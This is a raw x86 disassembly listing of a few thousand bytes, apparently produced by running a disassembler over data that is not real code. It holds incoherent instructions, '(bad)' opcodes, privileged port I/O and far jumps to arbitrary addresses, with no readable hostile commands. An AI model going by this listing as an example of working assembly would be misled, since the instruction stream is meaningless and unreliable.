  4116b1:	jl     0x4116cc
  4116b3:	inc    ebp
  4116b4:	cdq    
  4116b5:	pop    ds
  4116b6:	add    ecx,DWORD PTR [edx+0x2824b3ea]
  4116bc:	fisubr DWORD PTR [esi]
  4116be:	jge    0x411715
  4116c0:	rcr    BYTE PTR ds:0x6b16f7ea,0xe0
  4116c7:	mov    ch,0x28
  4116c9:	arpl   WORD PTR [ecx+0xd],cx
  4116cc:	mov    ebx,0xefbde3d
  4116d1:	pop    edx
  4116d2:	adc    al,0x4
  4116d4:	nop
  4116d5:	xor    esi,ebp
  4116d7:	inc    eax
  4116d8:	daa    
  4116d9:	push   ds
  4116da:	sub    eax,0x4b440663
  4116df:	ja     0x411671
  4116e1:	mov    dh,0xbd
  4116e3:	pop    es
  4116e4:	xor    dh,BYTE PTR [eax+0x1422bc77]
  4116ea:	push   ds
  4116eb:	sub    bl,BYTE PTR [ebp+0x3bf5c6d]
  4116f1:	inc    eax
  4116f2:	inc    esp
  4116f3:	mov    esp,DWORD PTR [edx+edi*1+0x1adc11e4]
  4116fa:	inc    edx
  4116fb:	out    0xea,eax
  4116fd:	jp     0x41174d
  4116ff:	test   DWORD PTR [esi],0x93b1876b
  411705:	xor    al,ah
  411707:	inc    ecx
  411708:	(bad)  
  411709:	hlt    
  41170a:	and    al,0x9e
  41170c:	push   cs
  41170d:	inc    ebx
  41170e:	xchg   edi,eax
  41170f:	test   al,0x69
  411711:	mov    dh,dh
  411713:	jo     0x411765
  411715:	sbb    al,0x54
  411717:	rcl    DWORD PTR [edx-0x6d],1
  41171a:	pop    es
  41171b:	ror    DWORD PTR [edx],cl
  41171d:	mov    bl,0x85
  41171f:	imul   BYTE PTR [esi+eax*4]
  411722:	fwait
  411723:	push   0x79
  411725:	stos   DWORD PTR es:[edi],eax
  411726:	imul   ebx,DWORD PTR [esi+0x65],0xf9d9cbfa
  41172d:	inc    edx
  41172e:	imul   ebx,DWORD PTR [edx-0x30c8026d],0xffffff96
  411735:	sub    dl,BYTE PTR [eax]
  411737:	mov    bh,0x20
  411739:	imul   edx,DWORD PTR [ebx+0x7375f8e9],0xb646ca05
  411743:	popf   
  411744:	add    edx,eax
  411746:	fst    st(1)
  411748:	adc    al,0x2c
  41174a:	loop   0x41172f
  41174c:	imul   eax,DWORD PTR [ebx],0xb879598e
  411752:	xchg   edx,eax
  411753:	sbb    cl,0x55
  411756:	ror    DWORD PTR [eax-0x1e],cl
  411759:	mov    ebp,0xfce43bb0
  41175e:	dec    ecx
  41175f:	jmp    0x1097:0x3129ae8c
  411766:	push   0x38d1e2f4
  41176b:	int    0x2f
  41176d:	out    dx,eax
  41176e:	jb     0x411776
  411770:	xchg   edi,eax
  411771:	pop    ds
  411772:	mov    ecx,0x6b0464d4
  411777:	mov    ah,dl
  411779:	xchg   ebp,eax
  41177a:	cmp    ebx,edx
  41177c:	aam    0xe8
  41177e:	xchg   edi,eax
  41177f:	sbb    esi,DWORD PTR [ecx-0x5b012bb5]
  411785:	les    eax,FWORD PTR [ecx+ecx*4]
  411788:	in     eax,0xe3
  41178a:	jae    0x41173a
  41178c:	or     eax,0x9cf58bc0
  411791:	fwait
  411792:	call   0x9289b9d6
  411797:	xor    DWORD PTR [eax],esi
  411799:	xchg   edx,eax
  41179a:	add    eax,esi
  41179c:	shl    DWORD PTR [edi-0x26],cl
  41179f:	es fwait
  4117a1:	or     DWORD PTR [edi-0x135e4506],esi
  4117a7:	ds (bad) 
  4117a9:	mov    bl,0x8a
  4117ab:	push   es
  4117ac:	rcr    BYTE PTR [ebp-0x8],0x7d
  4117b0:	pcmpeqd mm3,QWORD PTR [ebx]
  4117b3:	mov    ah,ch
  4117b5:	mov    ds:0xc196f7f1,al
  4117ba:	mov    BYTE PTR [eax+0x61],0x3e
  4117be:	sub    dh,BYTE PTR [eax-0x40]
  4117c1:	nop
  4117c2:	dec    esp
  4117c3:	popf   
  4117c4:	cmp    eax,0x9cb37971
  4117c9:	xor    eax,0xcc7ce483
  4117ce:	mov    esi,0xca4b2c91
  4117d3:	test   dl,bh
  4117d5:	jmp    0x98ada5a9
  4117da:	test   BYTE PTR [edi],bh
  4117dc:	inc    esp
  4117dd:	jmp    0x3d1cc08a
  4117e2:	or     DWORD PTR [eax+eiz*2-0x55],ecx
  4117e6:	adc    ebp,DWORD PTR [ecx-0x3a]
  4117e9:	vpand  xmm6,xmm4,XMMWORD PTR [ebp-0x1a]
  4117ee:	and    ebx,ebx
  4117f0:	xchg   edx,eax
  4117f1:	add    DWORD PTR [ebp+0x37],edx
  4117f4:	xor    eax,0x64d7922b
  4117f9:	mov    al,BYTE PTR [esi+0x40]
  4117fc:	mov    esi,0x420e92b4
  411801:	loopne 0x4117b0
  411803:	xchg   ecx,eax
  411804:	and    esi,ebx
  411806:	push   eax
  411807:	and    eax,0xa3c7e5c2
  41180c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41180d:	mov    edi,ecx
  41180f:	xchg   esi,eax
  411810:	sbb    eax,0x6d0161a2
  411815:	ins    BYTE PTR es:[edi],dx
  411816:	pop    ds
  411817:	ja     0x411819
  411819:	or     BYTE PTR [esi],0x87
  41181c:	adc    eax,0x8be6febc
  411821:	pop    es
  411822:	aam    0xb6
  411824:	mov    esi,0xd68004c2
  411829:	cmp    BYTE PTR [ebx+0x74958c21],bh
  41182f:	bound  edi,QWORD PTR [esi+eax*4+0x32]
  411833:	jecxz  0x41186d
  411835:	inc    edx
  411836:	bound  ebx,QWORD PTR [ebx]
  411838:	les    esi,FWORD PTR [esi+0x61]
  41183b:	push   ecx
  41183c:	loopne 0x4118ba
  41183e:	mov    cl,BYTE PTR [ecx]
  411840:	rol    BYTE PTR [ebp+0x4f],1
  411843:	and    eax,0x6a3be2d4
  411848:	imul   ecx,ecx,0xffffffc9
  41184b:	or     al,bl
  41184d:	mov    ds:0xe61ff726,al
  411852:	daa    
  411853:	fcomip st,st(6)
  411855:	stc    
  411856:	adc    edx,esp
  411858:	es in  al,0x6d
  41185b:	repnz pop ebp
  41185d:	dec    BYTE PTR [ecx-0x66]
  411860:	pop    es
  411861:	mov    ah,0xa0
  411863:	and    eax,0x33dcdbc5
  411868:	sahf   
  411869:	fdivr  QWORD PTR [edi]
  41186b:	mov    al,0x1a
  41186d:	cmp    DWORD PTR [edx+0x46],edi
  411870:	or     al,0xdd
  411872:	jns    0x41186d
  411874:	jb     0x41183a
  411876:	imul   edx,esi,0xffffffd2
  411879:	cwde   
  41187a:	dec    ebp
  41187b:	jne    0x411895
  41187d:	or     al,0x58
  41187f:	enter  0xdd66,0x5b
  411883:	sti    
  411884:	hlt    
  411885:	sub    dl,BYTE PTR [ebx-0x24]
  411888:	popa   
  411889:	pop    edi
  41188a:	sbb    eax,0xee5aba90
  41188f:	cmp    ecx,esi
  411891:	mov    ecx,0x75c76b0
  411896:	sub    DWORD PTR [edi+0x5b],esp
  411899:	mov    bl,0xcc
  41189b:	gs fs out dx,al
  41189e:	(bad)  
  41189f:	adc    ebp,DWORD PTR [ebx]
  4118a1:	adc    ebx,DWORD PTR [ebx-0x56]
  4118a4:	call   0x332c:0x6220a917
  4118ab:	lock fdivr st(3),st
  4118ae:	mov    BYTE PTR [ecx],bl
  4118b0:	pushf  
  4118b1:	sub    BYTE PTR [edx],cl
  4118b3:	aaa    
  4118b4:	(bad)  
  4118b5:	pusha  
  4118b6:	fst    st(3)
  4118b8:	or     BYTE PTR [edx+0x27],bl
  4118bb:	loope  0x41189d
  4118bd:	dec    ebp
  4118be:	lds    eax,FWORD PTR [ecx]
  4118c0:	outs   dx,BYTE PTR ds:[esi]
  4118c1:	adc    ebp,DWORD PTR [ebx-0x52298b7f]
  4118c7:	mov    ecx,0x3fff8092
  4118cc:	mov    ah,0xea
  4118ce:	ret    
  4118cf:	and    cl,al
  4118d1:	sar    BYTE PTR [edi],cl
  4118d3:	stc    
  4118d4:	in     al,0x6b
  4118d6:	and    esp,DWORD PTR [edi]
  4118d8:	xchg   esi,eax
  4118d9:	push   es
  4118da:	and    ch,bh
  4118dc:	add    ebx,DWORD PTR [ecx+0x4c]
  4118df:	mov    al,ds:0xdbe599ed
  4118e4:	test   dh,cl
  4118e6:	aad    0xfc
  4118e8:	retf   0x94a6
  4118eb:	push   es
  4118ec:	dec    BYTE PTR [esi+0x4b088b6]
  4118f2:	popf   
  4118f3:	(bad)  
  4118f4:	fldenv [esp+esi*2]
  4118f7:	pop    eax
  4118f8:	and    eax,0x356d8269
  4118fd:	sbb    BYTE PTR [esi-0x448634f8],al
  411903:	bound  edx,QWORD PTR [edx-0x517f8916]
  411909:	loopne 0x4118c4
  41190b:	leave  
  41190c:	cmp    ecx,DWORD PTR [esp+ecx*1]
  41190f:	cwde   
  411910:	and    bl,ah
  411912:	shr    cl,0xa2
  411915:	jbe    0x411929
  411917:	adc    eax,0xdfee057d
  41191c:	in     eax,dx
  41191d:	fst    DWORD PTR [edx-0x59621af4]
  411923:	jp     0x41191f
  411925:	xor    al,0xfe
  411927:	sbb    edi,DWORD PTR [edi+0x74]
  41192a:	nop
  41192b:	or     BYTE PTR [eax+0x45],cl
  41192e:	arpl   WORD PTR [edx+0x58967a3f],dx
  411934:	adc    DWORD PTR [ebp+0x21],edi
  411937:	jnp    0x411939
  411939:	add    DWORD PTR [ebx],eax
  41193b:	test   eax,0xb4541eb8
  411940:	jns    0x41195d
  411942:	mov    dh,0xe2
  411944:	stos   DWORD PTR es:[edi],eax
  411945:	mov    edi,0x5390608b
  41194a:	xor    ecx,ecx
  41194c:	aaa    
  41194d:	mov    ch,0xcf
  41194f:	sub    BYTE PTR [ebx+0x5d],0x2
  411953:	mov    eax,ebx
  411955:	(bad)  
  411956:	gs jp  0x411973
  411959:	fcom   QWORD PTR [eax+0x0]
  41195c:	popa   
  41195d:	xchg   ebx,eax
  41195e:	and    DWORD PTR [edi+0x30],eax
  411961:	push   ss
  411962:	pop    es
  411963:	retf   0xcda2
  411966:	gs pushf 
  411968:	inc    esi
  411969:	pop    ss
  41196a:	add    eax,0xba24a32c
  41196f:	sbb    DWORD PTR [esi+0x2db096db],esi
  411975:	out    dx,eax
  411976:	into   
  411977:	and    DWORD PTR [esi+0x8],ecx
  41197a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41197b:	fcomip st,st(4)
  41197d:	pop    eax
  41197e:	mov    esi,0x9346d914
  411983:	call   0x71ed10a3
  411988:	inc    ecx
  411989:	inc    eax
  41198a:	stos   DWORD PTR es:[edi],eax
  41198b:	adc    al,0x4d
  41198d:	xchg   edx,eax
  41198e:	inc    edx
  41198f:	shl    BYTE PTR [eax+0x6a1420af],1
  411995:	aam    0x82
  411997:	es push edx
  411999:	cmp    BYTE PTR [edi-0x3b394a46],al
  41199f:	add    BYTE PTR [ebx-0x9],0xbc
  4119a3:	outs   dx,BYTE PTR ds:[esi]
  4119a4:	imul   ebp,DWORD PTR [ebp+0x2b],0x73
  4119a8:	add    BYTE PTR [ebp-0x58],ch
  4119ab:	mov    ecx,0x89deeca0
  4119b0:	push   DWORD PTR [edi-0xf]
  4119b3:	fcomp  DWORD PTR [esi+0x5b]
  4119b6:	push   ecx
  4119b7:	jp     0x411940
  4119b9:	xor    al,0xe1
  4119bb:	lahf   
  4119bc:	adc    edi,DWORD PTR [ecx-0x67]
  4119bf:	inc    ebx
  4119c0:	dec    esp
  4119c1:	ret    
  4119c2:	cmc    
  4119c3:	jo     0x411a02
  4119c5:	ret    0xe65e
  4119c8:	jno    0x41198b
  4119ca:	adc    esp,DWORD PTR [edx]
  4119cc:	clc    
  4119cd:	xchg   ebp,eax
  4119ce:	outs   dx,BYTE PTR ds:[esi]
  4119cf:	and    eax,0x9586ac38
  4119d4:	in     eax,0xfa
  4119d6:	mov    ds:0xd32e5640,al
  4119db:	add    ebx,DWORD PTR [edx-0x28]
  4119de:	push   esp
  4119df:	jmp    DWORD PTR [edi+0x1a]
  4119e2:	mov    ch,0x13
  4119e4:	aam    0x2d
  4119e6:	push   DWORD PTR [ecx+0x553fe289]
  4119ec:	cwde   
  4119ed:	mov    WORD PTR [eax-0x77c4ffcd],?
  4119f3:	pop    ecx
  4119f4:	fisubr WORD PTR [edi-0x2e455847]
  4119fa:	pop    ebp
  4119fb:	cmp    BYTE PTR [esp+eax*1+0x5a],ah
  4119ff:	fs test al,0x7b
  411a02:	in     al,0xeb
  411a04:	adc    DWORD PTR ds:0x198bbdbb,ecx
  411a0a:	mov    ch,0x7a
  411a0c:	inc    esp
  411a0d:	stc    
  411a0e:	cdq    
  411a0f:	fidiv  WORD PTR [bp+di]
  411a12:	mov    al,ds:0xd4ffc7bf
  411a17:	enter  0xe604,0xb0
  411a1b:	(bad)  
  411a1d:	fisub  DWORD PTR [edi]
  411a1f:	cmp    ch,BYTE PTR [eax-0x8aeccc9]
  411a25:	clc    
  411a26:	int    0xe8
  411a28:	out    0xde,eax
  411a2a:	std    
  411a2b:	mov    ah,0x8b
  411a2d:	jmp    DWORD PTR cs:[edi-0x57]
  411a31:	iret   
  411a32:	rcr    DWORD PTR [edi+ebp*2],0xd1
  411a36:	pop    ds
  411a37:	es sti 
  411a39:	leave  
  411a3a:	mov    eax,edx
  411a3c:	fcmovb st,st(2)
  411a3e:	jns    0x411aa4
  411a40:	sub    eax,0x7b13c3d4
  411a45:	pop    esi
  411a46:	add    ah,BYTE PTR [eax+0x32]
  411a49:	push   0x32c0314b
  411a4e:	xor    BYTE PTR [ebx+0x38130bd9],bl
  411a54:	sub    dh,bh
  411a56:	pop    edx
  411a57:	call   0xd611:0x5f57765b
  411a5e:	add    edx,DWORD PTR [esi+0x5f0fbd5a]
  411a64:	mov    ecx,0x46a61ce1
  411a69:	rcl    dh,1
  411a6b:	push   ds
  411a6c:	ret    
  411a6d:	je     0x411a5e
  411a6f:	ficomp DWORD PTR [esi+0x77]
  411a72:	mov    esp,0x43f76e2c
  411a77:	scas   al,BYTE PTR es:[edi]
  411a78:	jmp    0xaa3ce4d8
  411a7d:	(bad)  
  411a7e:	mov    bh,0x22
  411a80:	jnp    0x411a52
  411a82:	push   ds
  411a83:	data16 arpl ax,bx
  411a86:	aaa    
  411a87:	dec    eax
  411a88:	pop    esi
  411a89:	push   ebp
  411a8a:	dec    edi
  411a8b:	outs   dx,BYTE PTR ds:[esi]
  411a8c:	inc    esp
  411a8d:	jmp    0x112a011f
  411a92:	and    BYTE PTR ds:0x3aaea1f5,bl
  411a98:	retf   0x7083
  411a9b:	imul   edi,DWORD PTR [edx-0x7d],0xc43643e1
  411aa2:	sahf   
  411aa3:	pop    edi
  411aa4:	(bad)  
  411aa5:	ffreep st(1)
  411aa7:	sub    cl,0xc2
  411aaa:	imul   ebp,DWORD PTR [ecx],0x72
  411aad:	jo     0x411a74
  411aaf:	and    al,0xf2
  411ab1:	out    0x2a,eax
  411ab3:	inc    edi
  411ab4:	es daa 
  411ab6:	cwde   
  411ab7:	repz xchg ebp,eax
  411ab9:	or     ch,BYTE PTR [edx-0x5f78d93f]
  411abf:	jge    0x411ad2
  411ac1:	add    esp,DWORD PTR [eax+0x36]
  411ac4:	outs   dx,BYTE PTR ds:[esi]
  411ac5:	cmp    al,BYTE PTR [eax+eax*2-0x2b709522]
  411acc:	ins    DWORD PTR es:[edi],dx
  411acd:	pop    ds
  411ace:	outs   dx,DWORD PTR ds:[esi]
  411acf:	leave  
  411ad0:	xchg   ebp,eax
  411ad1:	mov    edx,ebp
  411ad3:	pop    es
  411ad4:	fbstp  TBYTE PTR [ebx+0x11]
  411ad7:	inc    edx
  411ad8:	les    eax,FWORD PTR [esi+edi*1-0x41]
  411adc:	pop    ebp
  411add:	pop    ebp
  411ade:	mov    dh,0xa9
  411ae0:	dec    ebx
  411ae1:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  411ae3:	mov    eax,0x99a9c5d2
  411ae8:	push   ss
  411ae9:	cwde   
  411aea:	xchg   esp,eax
  411aeb:	inc    ch
  411aed:	pop    edx
  411aee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411aef:	mov    ecx,DWORD PTR [edi-0x77342d37]
  411af5:	xchg   cl,bl
  411af7:	jge    0x411b55
  411af9:	and    eax,0x20b7ac92
  411afe:	out    dx,eax
  411aff:	dec    esi
  411b00:	fild   QWORD PTR [ebx]
  411b02:	sahf   
  411b03:	push   eax
  411b04:	pop    esp
  411b05:	cmp    eax,0x91c59cc8
  411b0a:	(bad)  
  411b0b:	rol    DWORD PTR [esp],cl
  411b0e:	retf   0x3621
  411b11:	lods   eax,DWORD PTR ds:[esi]
  411b12:	div    BYTE PTR [ebx+esi*4+0x5d]
  411b16:	pop    esp
  411b17:	cmc    
  411b18:	les    esi,FWORD PTR [edi+0x33260ad4]
  411b1e:	cmp    eax,0x1d87072d
  411b23:	popa   
  411b24:	sbb    dl,BYTE PTR [eax]
  411b26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b27:	aaa    
  411b28:	push   0x47
  411b2a:	push   edx
  411b2b:	pop    es
  411b2c:	mov    eax,ds:0x3d017ec8
  411b31:	aas    
  411b32:	pop    ebx
  411b33:	(bad)  
  411b34:	sub    ebx,DWORD PTR [eax-0x2786c577]
  411b3a:	daa    
  411b3b:	lahf   
  411b3c:	mov    edi,0xb0bdabd5
  411b41:	or     eax,DWORD PTR [esi]
  411b43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b44:	sub    ch,bh
  411b46:	dec    ecx
  411b47:	fdiv   QWORD PTR [ecx]
  411b49:	pusha  
  411b4a:	fdiv   QWORD PTR [edx-0x5a7ca48f]
  411b50:	inc    eax
  411b51:	popa   
  411b52:	aad    0x1e
  411b54:	dec    ebp
  411b55:	popa   
  411b56:	cli    
  411b57:	add    dl,BYTE PTR [ebp+0x13d8c686]
  411b5d:	add    BYTE PTR [edx+0x1f3fb52f],0xe9
  411b64:	daa    
  411b65:	lea    eax,[ebx-0x5a2e7093]
  411b6b:	push   ds
  411b6c:	fwait
  411b6d:	mov    ch,0xb1
  411b6f:	js     0x411bc8
  411b71:	rcr    BYTE PTR [ecx],1
  411b73:	ins    DWORD PTR es:[edi],dx
  411b74:	into   
  411b75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b76:	test   eax,0xd050520a
  411b7b:	or     dl,BYTE PTR ds:0x8a892a1b
  411b81:	int3   
  411b82:	std    
  411b83:	and    BYTE PTR [edi+0x723ec5fa],dl
  411b89:	inc    esp
  411b8a:	mov    edi,DWORD PTR [edx-0x4edaa133]
  411b90:	jbe    0x411c07
  411b92:	aas    
  411b93:	and    bh,BYTE PTR [edx-0x7c]
  411b96:	aas    
  411b97:	push   ecx
  411b98:	add    DWORD PTR [ebx+0x7045c0d4],ebp
  411b9e:	stos   DWORD PTR es:[edi],eax
  411b9f:	jo     0x411b6a
  411ba1:	and    bl,BYTE PTR [eax+0x6f03e8ed]
  411ba7:	in     al,dx
  411ba8:	xor    esp,edx
  411baa:	(bad)  
  411bab:	dec    eax
  411bac:	and    al,0x5b
  411bae:	shl    DWORD PTR [edx+0x78],1
  411bb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bb2:	or     BYTE PTR [esi],0xa6
  411bb5:	add    ebx,esi
  411bb7:	test   al,al
  411bb9:	ins    DWORD PTR es:[edi],dx
  411bba:	pop    ebx
  411bbb:	xchg   DWORD PTR [ebp-0x3c],eax
  411bbe:	fisub  WORD PTR [ebx-0xe2a4667]
  411bc4:	cld    
  411bc5:	imul   eax,DWORD PTR [edx+0xc],0xe560ee7
  411bcc:	dec    ebx
  411bcd:	bound  ebx,QWORD PTR [esi]
  411bcf:	pushf  
  411bd0:	or     eax,0xcf59bf57
  411bd5:	push   ss
  411bd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bd7:	dec    edx
  411bd8:	and    eax,0x5b60dce
  411bdd:	mov    dh,0xab
  411bdf:	xchg   ch,bh
  411be1:	sti    
  411be2:	or     al,BYTE PTR [ebx+0x27]
  411be5:	ins    DWORD PTR es:[edi],dx
  411be6:	and    ebx,0x63fa1450
  411bec:	sbb    al,0x2a
  411bee:	(bad)  
  411bef:	les    eax,FWORD PTR [eax+0x6a]
  411bf2:	arpl   WORD PTR [ecx+0x299e456d],si
  411bf8:	pop    esi
  411bf9:	mov    dl,0xe7
  411bfb:	adc    eax,0x5cefd934
  411c00:	dec    esp
  411c01:	clc    
  411c02:	push   eax
  411c03:	dec    ebp
  411c04:	add    DWORD PTR [ebx+0x70],0x90c7b815
  411c0b:	add    al,0x48
  411c0d:	les    edx,FWORD PTR [edx-0x2b]
  411c10:	add    eax,0x5c137a8f
  411c15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c16:	push   es
  411c17:	jo     0x411c7a
  411c19:	xor    eax,0xa319a1bf
  411c1e:	push   edi
  411c1f:	pop    esp
  411c20:	aam    0xaa
  411c22:	mov    ds:0x4a772427,eax
  411c27:	push   edi
  411c28:	out    dx,eax
  411c29:	(bad)  
  411c2a:	jmp    0xf29a:0x908b13f1
  411c31:	add    DWORD PTR [eax-0x7e],esp
  411c34:	or     eax,0xd9707869
  411c39:	xor    BYTE PTR [edx],dh
  411c3b:	cdq    
  411c3c:	ja     0x411c9a
  411c3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c3f:	in     al,0x91
  411c41:	mov    BYTE PTR [esi-0x3f86342],cl
  411c47:	jae    0x411c3b
  411c49:	pop    edi
  411c4a:	je     0x411bcc
  411c4c:	sar    BYTE PTR [ebx],1
  411c4e:	leave  
  411c4f:	jmp    0x7a53856e
  411c54:	sub    BYTE PTR [esi-0x69],dh
  411c57:	pop    es
  411c58:	or     eax,0x1c9f7b24
  411c5d:	dec    edi
  411c5e:	push   cs
  411c5f:	add    ebx,ebp
  411c61:	dec    ebx
  411c62:	inc    ecx
  411c63:	push   es
  411c64:	rcr    DWORD PTR [edi-0x70ed1d6d],cl
  411c6a:	dec    edx
  411c6b:	mov    dh,0xb2
  411c6d:	(bad)  
  411c6e:	xchg   ebx,eax
  411c6f:	jb     0x411c27
  411c71:	stos   DWORD PTR es:[edi],eax
  411c72:	sbb    BYTE PTR [esi],dl
  411c74:	mov    cl,BYTE PTR [edi+0x59a9c5b8]
  411c7a:	inc    esi
  411c7b:	push   edx
  411c7c:	mov    ds:0x1696a87a,al
  411c81:	sub    eax,0xda876f9a
  411c86:	cmp    eax,0x3b69bde6
  411c8b:	daa    
  411c8c:	pop    ecx
  411c8d:	sbb    BYTE PTR [ebp-0x6d],ah
  411c90:	or     eax,0xc7aada1c
  411c95:	daa    
  411c96:	xchg   ebx,ebp
  411c98:	jns    0x411cb3
  411c9a:	push   eax
  411c9b:	and    DWORD PTR [edi+0x30],edx
  411c9e:	jle    0x411cd2
  411ca0:	xor    BYTE PTR [edi-0x35],ah
  411ca3:	call   0x2584:0x6a48d2a4
  411caa:	adc    al,ah
  411cac:	xchg   DWORD PTR [esi-0x4e668f2c],edi
  411cb2:	jmp    0xe7a5dc1f
  411cb7:	cdq    
  411cb8:	inc    ecx
  411cb9:	scas   eax,DWORD PTR es:[edi]
  411cba:	pop    es
  411cbb:	and    cl,dh
  411cbd:	push   0xb28134f7
  411cc2:	or     BYTE PTR [edi+0x6],al
  411cc5:	xchg   ebp,eax
  411cc6:	inc    edi
  411cc7:	inc    ebp
  411cc8:	lds    edx,FWORD PTR [ebp+0x24]
  411ccb:	jbe    0x411c91
  411ccd:	vpcmpgtd ymm2,ymm0,ymm1
  411cd1:	adc    DWORD PTR [ebx],0xd
  411cd4:	dec    ebp
  411cd5:	xor    DWORD PTR [esi+0x34],ebp
  411cd8:	das    
  411cd9:	out    0x57,eax
  411cdb:	xchg   ecx,eax
  411cdc:	pop    ds
  411cdd:	lods   eax,DWORD PTR ds:[esi]
  411cde:	pandn  mm3,QWORD PTR [edx-0x78]
  411ce2:	xor    eax,0x637878e6
  411ce7:	mov    DWORD PTR [esp+edi*2],0x50fe55bb
  411cee:	xor    cl,BYTE PTR [edx+0x22258c5d]
  411cf4:	mov    ebp,0xb8ec7451
  411cf9:	jl     0x411d36
  411cfb:	push   esi
  411cfc:	adc    edx,DWORD PTR [esi-0x55]
  411cff:	ret    
  411d00:	ss ins BYTE PTR es:[edi],dx
  411d02:	data16 scas al,BYTE PTR es:[edi]
  411d04:	out    dx,eax
  411d05:	cwde   
  411d06:	lahf   
  411d07:	push   esp
  411d08:	dec    ecx
  411d09:	pop    edx
  411d0a:	in     al,0x3c
  411d0c:	push   ss
  411d0d:	mov    edx,DWORD PTR ds:0xd88b5054
  411d13:	push   edi
  411d14:	ss jns 0x411d76
  411d17:	pop    es
  411d18:	cmp    DWORD PTR es:[esi+0x6886aae3],ebp
  411d1f:	xor    edx,DWORD PTR [ebx-0x3ec37f1c]
  411d25:	scas   al,BYTE PTR es:[edi]
  411d26:	sar    DWORD PTR [edi+0x38],cl
  411d29:	shr    DWORD PTR [eax-0x6],cl
  411d2c:	inc    ebp
  411d2d:	cmp    ch,BYTE PTR [ecx]
  411d2f:	pusha  
  411d30:	fdiv   QWORD PTR [ecx+ebx*2+0x18b89f6f]
  411d37:	mov    eax,ds:0x19409827
  411d3c:	push   ebx
  411d3d:	mov    ch,0x4e
  411d3f:	enter  0x2885,0xdd
  411d43:	and    eax,0x21357649
  411d48:	mov    ds:0x8c349976,al
  411d4d:	jg     0x411d50
  411d4f:	add    dh,BYTE PTR [edi-0x18b45e5e]
  411d55:	push   ebp
  411d56:	shr    BYTE PTR [edi-0x17],cl
  411d59:	jmp    0xcc9806db
  411d5e:	pop    esp
  411d5f:	sbb    al,0x10
  411d61:	out    0xc0,al
  411d63:	sub    al,0x89
  411d65:	jnp    0x411d21
  411d67:	xor    esp,ecx
  411d69:	push   cs
  411d6a:	shl    ebx,cl
  411d6c:	in     eax,dx
  411d6d:	lods   al,BYTE PTR ds:[esi]
  411d6e:	fcmove st,st(0)
  411d70:	(bad)  
  411d71:	pop    esp
  411d72:	xlat   BYTE PTR ds:[ebx]
  411d73:	pop    ebx
  411d74:	push   0xffffff98
  411d76:	(bad)  
  411d77:	mov    ebx,0x77a14e7a
  411d7c:	jbe    0x411db2
  411d7e:	adc    dh,BYTE PTR [edi+0x3e]
  411d81:	das    
  411d82:	add    esi,ebp
  411d84:	imul   edx,ecx,0x57d9a841
  411d8a:	test   BYTE PTR [ebx+0x3bde8003],dh
  411d90:	div    DWORD PTR [ebp+0x29]
  411d93:	or     ecx,edx
  411d95:	mov    bh,0x57
  411d97:	jne    0x411db1
  411d99:	sub    ebx,eax
  411d9b:	or     DWORD PTR [edx+esi*1+0x31],0x5e991f77
  411da3:	mov    ebx,0x9b6a61f9
  411da8:	mov    dh,0x85
  411daa:	adc    DWORD PTR [eax],esp
  411dac:	inc    ebx
  411dad:	mov    ecx,0xa853d22d
  411db2:	xchg   edi,eax
  411db3:	out    dx,al
  411db4:	jo     0x411d50
  411db6:	das    
  411db7:	fwait
  411db8:	call   0xa333:0x557fc1d
  411dbf:	test   al,0x3f
  411dc1:	inc    edx
  411dc2:	or     edi,DWORD PTR [ecx]
  411dc4:	mov    al,ds:0xbc12ba9c
  411dc9:	sub    BYTE PTR [ebp+0x63],dl
  411dcc:	mov    fs:0xeadef691,al
  411dd2:	cld    
  411dd3:	out    0x76,al
  411dd5:	xchg   ebx,eax
  411dd6:	pop    ds
  411dd7:	popa   
  411dd8:	sahf   
  411dd9:	xchg   edx,eax
  411dda:	iret   
  411ddb:	sti    
  411ddc:	fdiv   st,st(7)
  411dde:	aas    
  411ddf:	int3   
  411de0:	popa   
  411de1:	int3   
  411de2:	inc    edx
  411de3:	pop    ss
  411de4:	mov    BYTE PTR [edx],bh
  411de6:	shl    BYTE PTR [eax],0xbe
  411de9:	out    dx,eax
  411dea:	out    dx,al
  411deb:	adc    bl,BYTE PTR [esi]
  411ded:	aad    0xa5
  411def:	ret    0xa259
  411df2:	ja     0x411dab
  411df4:	push   es
  411df5:	sar    DWORD PTR [edx+0x18],cl
  411df8:	pop    ebp
  411df9:	call   0xde846d18
  411dfe:	gs push ebp
  411e00:	out    dx,eax
  411e01:	xchg   ecx,eax
  411e02:	repz sbb BYTE PTR [edx],al
  411e05:	in     al,0x1d
  411e07:	sbb    ecx,ebx
  411e09:	das    
  411e0a:	xor    ebx,DWORD PTR [ebx-0x582a9a5d]
  411e10:	pusha  
  411e11:	jmp    0x2658:0xf1be750b
  411e18:	sbb    ebx,DWORD PTR [eax+0x63]
  411e1b:	pop    eax
  411e1c:	add    ebp,ebp
  411e1e:	mov    ebx,0xe35deb25
  411e23:	push   0xffffffc0
  411e25:	out    dx,eax
  411e26:	sbb    eax,0x4802b36f
  411e2b:	es ret 
  411e2d:	push   esp
  411e2e:	dec    edx
  411e2f:	xchg   edi,eax
  411e30:	neg    BYTE PTR [esi+eax*1-0x3a]
  411e34:	scas   al,BYTE PTR es:[edi]
  411e35:	(bad)  
  411e36:	xchg   edi,eax
  411e37:	loope  0x411e27
  411e39:	mov    edi,0x51ec2122
  411e3e:	fldl2t 
  411e40:	call   0xfdf:0x85b210e
  411e47:	fild   DWORD PTR [edx]
  411e49:	outs   dx,BYTE PTR ds:[esi]
  411e4a:	rcr    edi,0xd3
  411e4d:	dec    BYTE PTR [edx+0x160766ba]
  411e53:	adc    bl,BYTE PTR es:[edx+ebp*2-0x57e4e0d9]
  411e5b:	sahf   
  411e5c:	xor    bl,al
  411e5e:	sub    esp,edi
  411e60:	sbb    edx,DWORD PTR ds:0xcae2cd0e
  411e66:	loopne 0x411e4f
  411e68:	inc    eax
  411e69:	stc    
  411e6a:	out    dx,eax
  411e6b:	jmp    0xd4a9:0x1064c355
